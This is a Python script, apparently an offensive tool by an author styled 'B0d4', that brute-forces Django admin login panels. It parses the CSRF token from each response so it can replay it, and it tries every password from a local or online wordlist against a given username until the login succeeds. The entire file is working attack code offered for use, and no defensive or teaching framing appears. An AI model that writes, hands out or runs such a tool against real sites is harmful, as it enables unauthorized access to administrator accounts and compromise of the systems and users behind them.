import sys
import requests
from bs4 import BeautifulSoup
import argparse

def logo():
    print("""
ＢＦ-Ｄｊａｎｇｏ Ａｄｍｉｎ Ｐａｎｅｌ ｉｎｃｌｕｄｅ ＣＳＲＦ ｂｙｐａｓｓ Ｂｙ Ｂ０ｄ４
                                                   """)

class BFLoginPanel:
    def __init__(self, domain_url: str, username: str, wordlist: str):
        self.domain_url = domain_url
        self.username = username
        self.wordlist = wordlist
        self.cookies = {}
        self.session = requests.Session()
        self.protocol_mode = "Local File Mode"
        for protocol in ["https://", "http://"]:
            if (self.wordlist.find(protocol) == 0):
                self.protocol_mode = "Internet Mode"

        print(self.protocol_mode + " (" + self.wordlist + ")")
        self.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': self.domain_url
        }
        if (self.protocol_mode == "Internet Mode"):
            try:
                self.wordlist = list(set(requests.get(self.wordlist).text.split('\n')))  # read dic and split lines & remove duplicates
            except Exception as e:
                print("[-] Error:\n", e)
                exit()
        else:
            try:
                self.f = open(self.wordlist, "r", encoding="ISO-8859-1")
                self.wordlist = list(set([(word.strip()) for word in self.f.readlines()]))
                self.f.close()
            except Exception as e:
                print("[-] Error:\n", e)
                exit()
        self.login_page = self.session.get(self.domain_url)
        self.BruteForce()

    def BruteForce(self):
        count = 0
        # Start Brute Force
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain_url  # Use the provided domain URL
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
                                                            'username': self.username,
                                                            'password': self.password}, cookies=self.cookies, headers=self.headers)
            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                exit()
            if "Please " not in self.login_page.text:
                print("[+] Found! " + self.username + " - " + self.password + " - "+ str(self.login_page.status_code)+"\n\n")
                exit()
            else:
                count += 1
                print("(" + str(count) + ") Attempt: " + self.username + " - " + self.password + " - "+ str(self.login_page.status_code))

def parse_arguments():
    parser = argparse.ArgumentParser(description="BF-Django Admin Panel Brute Force Tool")
    parser.add_argument("-d", "--domain", required=True, help="Full domain URL including path (e.g., https://example.com/asdc-dlp-admin/login/?next=/asdc-dlp-admin/)")
    parser.add_argument("-u", "--username", required=True, help="Username to brute force")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file or URL for online wordlist")
    return parser.parse_args()

if __name__ == '__main__':
    logo()
    args = parse_arguments()
    BFLoginPanel(args.domain, args.username, args.wordlist)
